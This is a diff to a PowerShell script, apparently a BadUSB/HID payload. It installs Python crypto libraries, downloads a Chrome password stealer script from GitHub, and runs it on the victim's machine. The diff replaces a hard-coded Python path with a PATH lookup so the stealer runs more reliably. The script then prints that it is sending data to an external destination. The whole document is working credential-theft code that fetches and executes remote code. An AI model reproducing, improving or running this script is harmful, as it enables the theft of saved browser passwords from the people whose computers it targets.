@@ -1,12 +1,22 @@
 cd $env:USERPROFILE\Documents
 
-$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
+#$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
 
 py -m pip install pycryptodomex pywin32
 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
 
-& $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
+#& $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
+# Search for Python in the PATH variable
+$pythonExe = Get-Command python | Select-Object -ExpandProperty Source
+
+# Check if Python was found
+if ($pythonExe -ne $null) {
+    # Execute the Python script using the found Python executable
+    & $pythonExe $Env:USERPROFILE\Documents\stealer.py
+} else {
+    Write-Host "Python not found in the PATH."
+}
 
 Write-Host "Sending data to $dc"
 
